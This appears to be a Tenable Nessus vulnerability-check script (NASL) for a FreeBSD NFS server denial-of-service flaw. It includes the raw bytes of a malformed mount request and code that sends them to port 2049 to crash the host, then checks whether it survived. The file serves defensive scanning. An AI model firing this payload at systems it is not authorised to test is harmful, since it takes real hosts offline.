#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote host is affected by a denial of service vulnerability. 

Description :

The NFS server on the remote host appears to be one from FreeBSD that
causes a kernel panic when it receives a malformed NFS mount request
via TCP.  An unauthenticated remote attacker can leverage this flaw to
crash the remote host. 

See also :

http://lists.immunitysec.com/pipermail/dailydave/2006-February/002982.html
ftp://ftp.freebsd.org/pub/FreeBSD/CERT/advisories/FreeBSD-SA-06:10.nfs.asc

Solution :

Use a firewall to restrict access to the NFS server or upgrade / patch
the affected system as described in the vendor advisory above. 

Risk factor : 

Medium / CVSS Base Score : 5 
(AV:R/AC:L/Au:NR/C:N/A:C/I:N/B:A)";


if (description) {
  script_id(20989);
  script_version("$Revision: 1.2 $");

  script_bugtraq_id(16838);

  script_name(english:"FreeBSD nfsd Malformed NFS Mount Request Denial of Service Vulnerability");
  script_summary(english:"Tries to crash remote FreeBSD host");
 
  script_description(english:desc);
 
  script_category(ACT_KILL_HOST);
  script_family(english:"Denial of Service");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("rpcinfo.nasl");
  script_require_ports("Services/RPC/nfs", 2049);

  exit(0);
}


if (islocalhost()) exit(0);
port = get_kb_item("Services/RPC/nfs");
if (!port) port = 2049;
if (!get_port_state(port)) exit(0);


# A bad NFS mount request.
req = raw_string(
  0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02,
  0x00, 0x01, 0x86, 0xa5, 0x00, 0x00, 0x00, 0x01, 
  0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04,
  0x2f, 0x74, 0x6d, 0x70
);


# Open a socket and try to crash the remote host.
soc = open_sock_tcp(port);
if (soc) {
  start_denial();

  send(socket:soc, data:req);
  close(soc);

  # Check whether it's now down.
  alive = end_denial();
  if (!alive) {
    security_warning(port);
    set_kb_item(name:"Host/dead", value:TRUE);
  }
}
